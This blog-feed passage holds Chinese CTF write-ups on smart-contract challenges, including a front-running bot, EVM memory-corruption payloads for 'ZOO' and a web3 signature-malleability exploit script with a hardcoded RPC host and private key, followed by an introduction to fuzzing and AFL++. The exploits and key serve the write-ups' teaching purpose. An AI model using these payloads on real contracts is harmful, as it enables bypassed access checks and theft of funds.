必要的信息比如 chain_id, signer；最后实例化 executor 和 strategy，并启动
burberry 的 engine.</p>
<p>值得注意的是，main 函数是基于 tokio 实现的，而 tokio
是事件驱动的，这解释了后面 process_event
为什么没有被调用，但仍能被触发。</p>
<h3 id="executor.rs">[1-1-1] executor.rs</h3>
<p>executor 比较简单，没什么值得注意的地方</p>
<h3 id="strategy.rs">[1-1-2] strategy.rs</h3>
<p>主要注意 <code>process_event</code> 函数，它调用的 process_new_block
和 process_pending_tx 是关键函数。首先看 process_new_block。</p>
<p>process_new_block 函数主要负责
registerBlock，每当新区块被挖掘出来就调用 registerBlock。</p>
<p>process_pending_tx
中，每当接收到新交易就模拟这笔交易执行的环境，在evm中执行并获取执行日志，如果日志中发现了
workProved 的函数签名，bot 就会验证参数 pow
的正确性，如果它发现这是正确的，就会用更高的价格在我们之前注册这笔交易。具体细节可以看下面这段代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 0x27d4563e</span><br><span class="line">let sig: [u8; 4] = [0x27, 0xd4, 0x56, 0x3e];</span><br><span class="line">// concat sig and pow</span><br><span class="line">let mut data = Vec::with_capacity(4 + 32);</span><br><span class="line">data.extend_from_slice(&amp;sig);</span><br><span class="line">data.extend_from_slice(pow.as_slice());</span><br><span class="line">let bytes = Bytes::from(data);</span><br><span class="line"></span><br><span class="line">let bn = finalized_block.header.number.unwrap();</span><br><span class="line">let nonce = *self.nonce_map.get(&amp;bn).unwrap();</span><br><span class="line"></span><br><span class="line">let effective_gas_price = tx.gas_price.or(tx.max_fee_per_gas).unwrap_or_default();</span><br><span class="line">let chain_id = self.provider.get_chain_id().await.unwrap();</span><br><span class="line">let tx_receipt = TransactionRequest &#123;</span><br><span class="line">    from: Some(self.sender_addr),</span><br><span class="line">    to: Some(TxKind::Call(self.chall_addr)),</span><br><span class="line">    gas_price: Some(effective_gas_price * 2),</span><br><span class="line">    gas: Some(100_0000),</span><br><span class="line">    input: TransactionInput::new(bytes),</span><br><span class="line">    chain_id: Some(chain_id),</span><br><span class="line">    nonce: Some(nonce),</span><br><span class="line"></span><br><span class="line">    ..Default::default()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以观察到 <code>tx_receipt</code> 中 <code>gas_price</code>
被设置成了 effective_gas_price * 2，而 effective_gas_price 是我们发起的
tx 的 gas_price 或 max_fee_per_gas。这样会导致什么问题呢？由于 bot 是用
anvil 模拟的，而 anvil 会</p>
<h2 id="解题">[1-2] 解题</h2>
<h3 id="爆破-keccak256">[1-2-0] 爆破 keccak256</h3>
<p>爆破出前两字节为 0000 的 keccak256 比较简单，以下是爆破脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> keccak</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        keccak_hash = keccak.new(digest_bits=<span class="number">256</span>)</span><br><span class="line">        <span class="built_in">pow</span> = i.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        packed = <span class="built_in">pow</span> + <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;00&#x27;</span>*<span class="number">31</span> + <span class="string">&#x27;02&#x27;</span>)</span><br><span class="line">        keccak_hash.update(packed)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(keccak_hash.hexdigest(), <span class="number">16</span>) &lt; <span class="number">2</span>**<span class="number">240</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found valid PoW:&#x27;</span>, <span class="built_in">pow</span>.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hash:&#x27;</span>, keccak_hash.hexdigest())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pow</span>()</span><br></pre></td></tr></table></figure>
<h3 id="section">[1-2-1]</h3>
<h1 id="sekai">[2] 2024 Sekai</h1>
<h2 id="play-to-earn">[2-0] Play to Earn</h2>
<p>这道题实现的 ArcadeMachine 即游戏机可以向 0
地址转账，我一开始觉得这是烧币没啥用...后来发现 permit 里的 ecrecovor
出错时会返回 0 而不是直接回滚，所以可以让 allowance[0][my_address] 为
13.37，然后烧币+转账就可以了</p>
<p>另外有时间的时候可以看看这篇<a
href="https://blog.blockmagnates.com/sekai-ctf-2024-deep-dive-into-the-play-to-earn-blockchain-challenge-a8156be9d44e">medium</a></p>
<h2 id="イベント">[2-1] イベント！</h2>
<p>这道题怎么还用 rust 搞了个服务器...有点复杂，改天再看</p>
<h2 id="zoo">[2-2] ZOO</h2>
<p>这道题怎么还要手撕字节码...有点复杂，今天看了吧...</p>
<p>逻辑很简单，ZOO 里的 fallback 函数接收 calldata 设置
local_animals，然后调用 commit 把 memory 里的 animals 推到 storage
里。问题出在下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public isSolved;</span><br><span class="line">AnimalWrapper[] public animals;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mstore(0x00, animals.slot)</span><br><span class="line">let slot_hash := keccak256(0x00, 0x20)</span><br><span class="line">let animal_addr := sload(add(slot_hash, mul(2, idx)))</span><br><span class="line">let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))</span><br></pre></td></tr></table></figure>
<p>由于 isSolved 就在 animals 的上面，所以我们可以让 animal_addr 指向
isSolved - 1，animal_counter 就指向了
isSolved，而且对于内联汇编的溢出，GPT是这样说的：</p>
<blockquote>
<p>在Solidity 0.8.0
及更高版本中，整型运算默认启用了溢出和下溢检查。这意味着，在高层次的Solidity代码中，诸如
+、-
等运算符在出现溢出或下溢时会自动抛出异常（revert）。然而，这个默认的安全机制并不自动适用于内联汇编（Yul）代码。</p>
</blockquote>
<p>所以我们可以大胆构造了：</p>
<p>构造...构造不出来...因为有 whenNotPaused 这个修饰符不让你进这个
commit 函数，并且 idx 不能大于 7...</p>
<p>但跟 Nightu 师傅交流之后我得知 forge
可以动调合约，所以准备跑起来看看。另外，fallback
函数中还有这一段可以控制 idx=7 的 local_animals 指针：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let copy_size := sub(0x100, mul(0x20, idx))</span><br><span class="line">mcopy(offset, add(offset, 0x20), copy_size)</span><br></pre></td></tr></table></figure>
<p>既然我们可以控制指针，就可以在 0x21
修改时对任意内存写了，我们来布置一下任意memory写的payload：</p>
<p>首先，10 00 0000 xxxx(2byte的animal_index) + 30 07，这样就可以把 idx
= 7 的 offset 改成我们任意想要的 2byte</p>
<p>其次，20 07 21 xxxx(2byte的name_length) + payload(长为
name_length)，这样就可以把长度为 payload 的 name_length 复制到上面
animal_index
指向的内存位置了，但这种方式覆盖之后，如果op不是10,20,30，立刻就会break，并且就算不break，由于temp已经被写完，我们也无法再修改了。</p>
<p>既然我们解决了如何写，我们要解决一下要写什么。主要问题有两个：①绕过
whenNotPaused，这个可以通过修改 functions 这一函数指针，直接跳到
whennotPaused 之后。②在 commit 最后一个 sstore 时把 isSolved 改成 1.</p>
<p>我们先来动调看看第一个问题：要解决这个问题，首先我们要知道函数指针存在
memory 的哪里，之后我们得确定修改成什么才能绕过。</p>
<p>存在 memory 的什么地方这个很简单，我们只要看跳转都 commit 时 JUMPDEST
之前的 JUMP 语句栈上第一个变量是什么就行了，我们可以看到是
0x31b，而0x31b存在 memory 的 0xa0 那一行，所以我们要改掉 0xa0
这一行，不过我们先不改，继续看需要改成什么才能绕过。</p>
<p>我们继续单步走下去，看到走到 Address 为 322 时就要跳到 431 去 revert
了，所以我们只需要改成 323，就能绕过这条 jump。综上，我们知道要将 0xa0
这一行的 0x31b 改为 0x323.</p>
<p>所以我们构造的 payload 是：10 00 0000 007e 30 07 20 07 21 0002
0323，动调起来发现已经可以绕过 whenNotPaused 了。</p>
<p>之后，我们再来解决第二个问题：如何写进 isSolved.</p>
<p>commit 里的 sstore
就只有最后那一个，所以我们要想办法在这里做手脚。但由于我们之前布置的
payload 已经 break 了，所以我们希望修改一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 00 0000 01db</span><br><span class="line">10 00 0000 0000 &lt;- 由于我们需要控制 length 为1，所以要多布置一个块</span><br><span class="line">30 07</span><br><span class="line">20 07 21 0025</span><br><span class="line">20 07 22 0323</span><br><span class="line">00000000000000000000000000000000 00000000000000000000000000000080 </span><br></pre></td></tr></table></figure>
<p>现在我们已经可以顺利进入 commit 的 for(i&lt;length)
循环了，我们接下来的任务是看“什么操控了最后sstore的参数”</p>
<p>我们注意到 40 57 87 fa 12 a8 23 e0 f2 b7 63 1c c4 1b 3b a8 82 8b 33
21 ca 81 11 11 fa 75 cd 3a a3 bb 5a ce 是
slot_hash，而又有下面的代码可知</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let slot_hash := keccak256(0x00, 0x20)</span><br><span class="line">let animal_addr := sload(add(slot_hash, mul(2, idx)))</span><br><span class="line">let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))</span><br></pre></td></tr></table></figure>
<p>slot_hash + 2*idx 是 animal_addr，slot_hash + 2*idx + 1 是
animal_counter，那我们合理怀疑 slot[2] 里存的就是这个
slot_hash，动态数组通过访问这个hash值+offset来访问成员。又因为 slot[1]
是 isSolved 变量，所以在 sstore
的参数<code>add(add(slot_hash, mul(2, idx)), 1),</code>中，我们需要计算出
idx，使这个参数等于1，最后可以算出来是0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299,因此最后的payload为<code>1000000001fb10010000133730072007210045200722032300000000000000000000000000000000000000000000000000000000000000805fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299</code></p>
<p>另外，通过这道题我发现了其他几个之前没注意的点:</p>
<ol type="1">
<li><p>在函数被调用之前，EVM会先给这个函数初始化一些环境，还有检查一些内容</p></li>
<li><p>编译器对 solidity 做的优化还挺多的，比如 switch 里的判断</p></li>
<li><p>太夸张了，看N1的wp，我最多就能想到用一个指针去任意地址写，N1的payload用
21 覆盖了原有的指针后，再用覆盖的指针去修改了其他位置</p></li>
<li><p>如果无法方便地利用任意地址读写控制一片内存区域，不妨想想这片内存区域本身的定义是什么，我们是否可以通过原本的定义让他存下某个值（比如本题的
length 就是 animals_counter）</p></li>
</ol>
<h1 id="dasctf-金秋十月赛">[3] 2024 DASCTF 金秋十月赛</h1>
<h2 id="open-sesame">[3-1] Open sesame</h2>
<h1 id="suctf">[4] 2025 SUCTF</h1>
<h2 id="onchain-machine">[4-1] Onchain Machine</h2>
<p>攻击核心在于不同的(v,r,s)可以通过ecrecover恢复出相同的地址。所以首先调用signin把自己注册为magician，然后调用openbox时换用另一套签名的v和s，就能使signer相同但hash不同的，从而绕过对hash的检测。exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> web3.exceptions <span class="keyword">import</span> ContractLogicError</span><br><span class="line"></span><br><span class="line">rpc_url = <span class="string">&quot;http://1.95.156.61:10002&quot;</span></span><br><span class="line">contract_address = <span class="string">&quot;0x0aFDC4FEE2EDd6f0E745dadBF840208114aeb943&quot;</span></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&#x27;7fe6e1cb9528b5c92eb761beddf528611092383156f7a2dee74f2896ee2182b0&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line">account = w3.eth.account.from_key(private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;account address:&#x27;</span>, account.address)</span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target.abi&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> abi_file:</span><br><span class="line">    abi = json.load(abi_file)</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address=Web3.to_checksum_address(contract_address), abi=abi)  <span class="comment"># 替换为实际 ABI</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_message</span>(<span class="params">private_key, message_hash</span>):</span><br><span class="line">    <span class="keyword">return</span> w3.eth.account._sign_hash(message_hash, private_key=private_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_uint8</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> value &amp; <span class="number">0xff</span>  <span class="comment"># 取低8位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes32</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> value.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magician_address = account.address</span><br><span class="line">msgHash = contract.functions.getMessageHash(Web3.to_checksum_address(magician_address)).call()</span><br><span class="line">signature = sign_message(private_key, msgHash)</span><br><span class="line"></span><br><span class="line">v, r, s = signature.v, signature.r, signature.s</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line">s2 = n - s</span><br><span class="line">r2 = r</span><br><span class="line">v2 = <span class="number">27</span> <span class="keyword">if</span> v == <span class="number">28</span> <span class="keyword">else</span> <span class="number">28</span></span><br><span class="line"></span><br><span class="line">param1 = (int_to_uint8(v), int_to_bytes32(r), int_to_bytes32(s))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    txn = contract.functions.signIn(param1).build_transaction(&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: magician_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.get_transaction_count(magician_address),</span><br><span class="line">        <span class="string">&quot;gas&quot;</span>: <span class="number">300000</span>,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.to_wei(<span class="string">&quot;10&quot;</span>, <span class="string">&quot;gwei&quot;</span>),</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)</span><br><span class="line">    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;SignIn Transaction Hash: <span class="subst">&#123;tx_hash.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Transaction succeeded:&quot;</span>, receipt)</span><br><span class="line"><span class="keyword">except</span> ContractLogicError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Contract error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Other error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">param2 = (int_to_uint8(v2), int_to_bytes32(r2), int_to_bytes32(s2))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    txn = contract.functions.openBox(param2).build_transaction(&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: magician_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.get_transaction_count(magician_address),</span><br><span class="line">        <span class="string">&quot;gas&quot;</span>: <span class="number">300000</span>,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price * <span class="number">2</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn2 = w3.eth.account.sign_transaction(txn, private_key=private_key)</span><br><span class="line">    tx_hash2 = w3.eth.send_raw_transaction(signed_txn2.raw_transaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;OpenBox Transaction Hash: <span class="subst">&#123;tx_hash2.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_hash2, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Transaction succeeded:&quot;</span>, receipt)</span><br><span class="line"><span class="keyword">except</span> ContractLogicError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Contract error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Other error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.isSolved().call())</span><br></pre></td></tr></table></figure>
<p>小gadgets</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看余额</span></span><br><span class="line"><span class="comment"># balance_wei = w3.eth.get_balance(Web3.to_checksum_address(account.address))</span></span><br><span class="line"><span class="comment"># print(balance_wei)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看ecrecover的恢复地址</span></span><br><span class="line"><span class="comment"># recovered_address = w3.eth.account._recover_hash(msgHash, vrs=(v, r, s))</span></span><br><span class="line"><span class="comment"># print(f&quot;Recovered Address: &#123;recovered_address&#125;&quot;)</span></span><br><span class="line"><span class="comment"># recovered_address = w3.eth.account._recover_hash(msgHash, vrs=(v2, r2, s2))</span></span><br><span class="line"><span class="comment"># print(f&quot;Recovered Address: &#123;recovered_address&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看调用内容</span></span><br><span class="line"><span class="comment"># input_data = &#x27;0x56f80694000000000000000000000000000000000000000000000000000000000000001cf7eaa8db6ab3ac102c9f9be2173e7a944d954ae247b03b2ef7925df6dd1f1d001d1126fc8b0ba6034798d39db0a7ab2568c4b0ca810ce8494bf203c718991a48&#x27;</span></span><br><span class="line"><span class="comment"># decoded = contract.decode_function_input(input_data)</span></span><br><span class="line"><span class="comment"># print(decoded)</span></span><br><span class="line"><span class="comment"># input_data = &#x27;0x64327ff0000000000000000000000000000000000000000000000000000000000000001bf7eaa8db6ab3ac102c9f9be2173e7a944d954ae247b03b2ef7925df6dd1f1d00e2eed90374f459fcb8672c624f5854d951ea2c1c2e3bb7f273e05ac5b79d26f9&#x27;</span></span><br><span class="line"><span class="comment"># decoded = contract.decode_function_input(input_data)</span></span><br><span class="line"><span class="comment"># print(decoded)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟测试，并非真实交易，require不会在真实交易里产生日志</span></span><br><span class="line"><span class="comment"># 所以用模拟交易来查看require返回内容</span></span><br><span class="line"><span class="comment"># 1. 调用 signIn</span></span><br><span class="line">param1 = (int_to_uint8(v), int_to_bytes32(r), int_to_bytes32(s))</span><br><span class="line"><span class="comment"># 2. 调用 openBox</span></span><br><span class="line">param2 = (int_to_uint8(v2), int_to_bytes32(r2), int_to_bytes32(s2))</span><br><span class="line"><span class="comment"># SignIn测试</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    contract.functions.signIn(param1).call(&#123;<span class="string">&#x27;from&#x27;</span>: magician_address&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Call succeeded!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Call failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># openBox测试</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    contract.functions.openBox(param2).call(&#123;<span class="string">&#x27;from&#x27;</span>: magician_address&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Call succeeded!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Call failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.isSolved().call())</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>fuzz - 浅析原理与 AFLpp 使用</title>
    <url>/posts/34368.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
最近在学习 fuzz，写一篇文章来梳理一下相关芝士
</blockquote>
<span id="more"></span>
<blockquote>
<p>目前只做了一个框架，具体的技术细节之后再填补进来</p>
</blockquote>
<h1 id="原理">[1] 原理</h1>
<h2 id="什么是-fuzz">[1-1] 什么是 fuzz?</h2>
<p>fuzzer 是实施 fuzz 这一操作的工具，它将一系列测试样本 (testcase)
输送给 PUT(Program Under Test)，用以检测 PUT
在大量测试样本下功能是否可以正常运行。所以通俗来说，fuzz
技术就是生成一堆 testcases，然后让 PUT 去执行这些 testcases。</p>
<p>但我们也知道，程序的输入集合可以是无穷大的（程序可以有任意的输入），但能触发
bugs 的输入集合的大小却远小于程序的输入集合，我们称这种现象为 sparse
defects
space。如果算力也是无穷、计算速度可以忽略不计的话，我们当然可以遍历输入空间来“大海捞针”，但事实是我们并不能这样做。因此，我们需要找到最优的
testcases，这些 cases 可以在最短时间内找到最多的 bugs。</p>
<p>那么，我们如何找到这样的 cases 呢？我们得先搞明白什么样的 testcases
是最优的。</p>
<h2 id="什么样的-testcases-是最优的">[1-2] 什么样的 testcases
是“最优”的？</h2>
<p>在 fuzz 领域中，研究者将 testcases 的度量指标称为 fitness。如果
fitness 好，就说明这个 testcases 是好的，它代表的 seed 也是好的。</p>
<p>常见的 fitness 主要是 bugs 和 coverage。bugs
的思想很朴素，就是如果你这个 testcases 找到了 bugs，就说明这类 testcases
是好样的。不过这种方式还是太片面了，因为 defects space 是 sparse
的，能找到这种 bugs 的 testcases 并不代表它能找到其他
bugs。所以研究者们又提出了 coverage 这个 fitness。</p>
<h3 id="coverage">[1-2-1] Coverage</h3>
<p>常见的 coverage 有很多：code coverage, instruction coverage, edge
coverage, basic block coverage and etc. 最常见的还是 code coverage 和
edge coverage。</p>
<p>code coverage 多应用于源代码，比如我们可以检测这个 testcases
经过的行覆盖率(line)、分支覆盖率(branch)、函数覆盖率(function)以及语句覆盖率(statement)，这些
coverage 的测量可以帮助 fuzzer 理解这个 testcases
是否充分覆盖了代码逻辑。而 edge coverage
主要基于代码的控制流图(CFG)。</p>
<p>种类虽然多，但不用死记硬背，最重要的还是把握这种思想，用 coverage
作为 testcases 的评价标准。</p>
<h2 id="如何找最优的-testcases">[1-3] 如何找最优的 testcases?</h2>
<p>我们已经确定了什么样的 testcase
是最优的，接下来就是去寻找这样的用例了。</p>
<p>最朴素的想法是，我们随机构造一堆输入作为 testcases 输入给
PUT，然后检测每个 testcases 的 fitness。但前文说过的 sparse defects
space 使得这种方法十分低效，因此我们需要找到更有效的方式。</p>
<p>我们都知道，某种程序肯定主要用来处理固定格式的输入，比如 PDF parser
处理 PDF 文件、正则引擎处理正则表达式、DOM 处理器处理 DOM
格式的输入...那么我们可以根据测试对象的不同，保证输入格式几乎完全符合对象的要求（如果要
fuzz 错误格式我们也可以调整），以此来大幅度缩减 fuzzer 要搜索的
testcases
空间。那么，有些读者朋友可能就要问了：主播主播，如何做到你说的这一点呢？很简单的兄弟，你继续往下看就知道了。</p>
<h3 id="构建-initial-seed-pool">[1-3-1] 构建 initial seed pool</h3>
<p>首先，我们需要构建一个 seed pool(也有人叫它 seed set)，保证我们的
testcases 是围绕 PUT 去生成的，至少不会卡在程序对格式的 validation。</p>
<p>生成 seed pool 主要有三种方式： 第一，程序的开发者都会给程序提供
benchmark，我们可以直接把 benchmark 作为 initial seed pool。
第二，对于那些常见的文件格式，我们可以通过 crawler
来获得网上现有的文件，以此初始化种子池。 第三，可以使用别人做过的 POC
Sample，这些也是极好的输入用例。</p>
<p>但是我们知道这些都是已经被 PUT 处理过的 testcases
了，只有这些肯定是不够的，我们需要新的 testcases，该怎样生成呢？</p>
<h3 id="生成新的-testcases">[1-3-2] 生成新的 testcases</h3>
<p>根据 testcases 生成方式的不同，研究者们把 fuzzer
分为两类：Generation-based fuzzer 和 Mutation-based fuzzer。</p>
<p>我还没有搞明白 generation 和 mutation
有什么本质上的区别，因为感觉都是基于初始 seed
和某种规则变幻而来的。可能是由于 mutation 是在 seed
的基础上做一些操作，而 generation 是直接基于 seed
的格式生成一些内容？</p>
<p>这一部分先打上一个问号，我先大概讲述一下 mutation-based fuzzer
的原理。</p>
<h4 id="mutation-based-fuzzer">[1-3-2-1] Mutation-based Fuzzer</h4>
<p>在讲 mutation-based fuzzer 之前，我们先来说一下遗传算法(Evaluation
Algorithm, EA)。</p>
<p>遗传算法的逻辑大概是这样的：假设我们有一个种群(population)，里面有许多个体(individual)。根据适者生存的法则，对环境适应度较好(higher
fitness)的个体会生存下来(higher
energy)，而不能适应环境的个体则会被淘汰(low
energy)。生存下来的个体会产生后代，后代保持着与祖先类似的基因，但是由于基因变异(Mutation)，后代的部分基因会不同于祖先，这种基因的多样性一定程度上保证了对新环境(new
fitness feedback)的适应性。</p>
<p>换到 fuzzer 中，EA 的逻辑是这样的：假设我们有一个总祖先为 seed0
的种群(population)，里面有许多由 seed 生成的
testcases(individual)。根据适者生存的法则，具有较高 code coverage 的
testcases 会生存下来(给这个 testcases 或者它对应的 seed 赋予更多的
energy，energy之后在细讲，这里理解个大概意思就行)。energy 未耗尽的 seed
或者 testcases 会继续变异产生新的 testcase，这样的逻辑一定程度上保证里
fuzzer 趋于选择具有更高 code coverage 的 testcases。</p>
<p>那么，如何变异呢？对于程序来说，它的输入无非就是一堆字节，我们要做的事情只有两件：①确定变异哪些字节(WHERE)
②如何变异这些字节(HOW)</p>
<p><strong>WHERE TO MUTATE.</strong>
最朴素的思想还是随机挑一些字节来变异。但目前的研究主要使用程序分析技术来选择要变异的字节：比如我们可以通过污点分析技术来判断哪些字节影响了某个
branch 的控制变量，或者是通过符号执行来求解出"为到达某个状态所需要的
fixed
字节"。当然，最近几年基于机器学习的方法也不断涌现，成为了一个新的小方向。</p>
<p><strong>HOW TO MUTATE.</strong>
最朴素的思想是随机替换。当然我们也可以用常见的边界案例(edge
cases)来替换这些要 mutate 的字节，比如 -1, MAX_INT
这种。此外，对现有输入做一些算术运算也是可以的。还有一种方法是把所有
testcases
按照所需格式打碎成片(fragments)，然后把这些碎片随机拼凑起来，这种方法大概率能满足程序对格式的
validation，code coverage 相对较高。</p>
<h4 id="generation-based-fuzzer">[1-3-2-2] Generation-based Fuzzer</h4>
<p>我对 generation-based fuzzer
不甚了解，因此就不在这里讲述了。目前我遇到的 fuzzer
还都是基于变异的，基于生成的 fuzzer 可能比较有针对性吧。</p>
<h3 id="赋能">[1-3-3] 赋能</h3>
<p>前文 EA 算法逻辑有提到，如果一个 testcase 有较高的
fitness，那就说明它有更高的变异价值，所以我们就可以让这个 testcase/seed
活得更久一些，也就是给它更多的 energy。</p>
<p>举例来讲，我们可以为每个 testcase 维护一个 energy 变量，fuzzer
每执行一秒它就减一，或者每执行一条指令它就减一；而当这个 testcase 触发了
bugs，或者是有较高的 coverage，我们就可以适当的增加
energy，从而保证它能在 fuzzer 中活得更久。如果在某一次执行当中这个
testcase 耗尽了 energy，负责管理 testcase 的 population 就可以删除这个
testcase 的相关信息了。</p>
<h2 id="fuzzer-精简架构">[1-4] Fuzzer 精简架构</h2>
<p>至此，我们已经了解了如何构建 seed
pool，以及如何通过遗传算法在一次次执行中选出最优的
testcases，接下来我们可以宏观地了解一个 fuzzer
的架构是怎样的：不同人有不同的理解，我认为 fuzzer
可以分为三部分：generator, executor 和 detector.大体流程如下：</p>
<p>seed pool -(seeds)-&gt; Generator -(testcase)-&gt; Executor
-(states)-&gt; Detector -(fitness)-&gt; Generator</p>
<p><strong>Generator</strong> 负责 testcase 的生成。可以理解为 EA 的
fuzz 实现。包含如何初始化 seed pool，如何根据 fitness 反馈进行下一步的
mutation, crossover 和 selection。</p>
<p><strong>Executor</strong> 负责反复执行 testcase
并记录执行过程中的状态(比如 coverage or consumption)。</p>
<p><strong>Detector</strong> 主要负责监控 executor
的状态，并判断某一状态是否异常，进而找到 bugs，并及时反馈
fitness。举个最简单的例子，对于那些能引发 crashes 的漏洞，detector
只需要监控 OS 是否抛出 exception，如果抛出异常那就说明当前的 testcase
是能触发 bugs 的，此时 detector 就会反馈给 user 这样的 testcase 能触发
这种 bugs。同时，detector 还会意识到这个 testcase 和 seed
是好的，因此会让 generator 给这个 testcase/seed 赋予更高的 energy。</p>
<h2 id="优化">[1-5] 优化</h2>
<p>现在，我们已经了解了 fuzzer 的基本架构，接下来看看 fuzzer
当前面临着什么样的困难和挑战：</p>
<p>首先，fuzzer 的资源消耗过多。由于每个 testcase
都需要执行程序，程序执行一次所需要的时间越长，fuzzer
所需的时间等资源就越多。</p>
<p>接下来我将根据 fuzzer 的架构，从前向后开始讲述如何优化：</p>
<h3 id="最小化-seed-pool">[1-5-1] 最小化 seed pool</h3>
<p>由于在初始阶段，每个 seed 都会被分配近似的 energy，如果 seed pool
